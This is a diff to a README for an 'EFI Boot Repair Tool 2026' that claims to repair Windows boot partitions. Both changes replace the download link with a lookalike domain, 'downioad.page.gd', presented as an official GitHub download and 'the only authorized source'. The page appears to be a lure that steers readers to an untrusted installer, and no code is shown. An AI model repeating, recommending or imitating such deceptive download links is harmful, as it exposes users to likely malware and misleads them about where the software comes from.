@@ -2,7 +2,7 @@
 
 Welcome to the EFI Boot Repair Tool 2026, your go-to solution for fixing EFI boot issues on Windows systems. This tool is designed to repair corrupted EFI boot partitions, rebuild boot loaders, and restore your system to a bootable state with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ If you encounter issues, try the following:
 
 For the latest version, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This is the only authorized source for downloading the EFI Boot Repair Tool. Always ensure you have the most recent version for optimal performance and security.
 
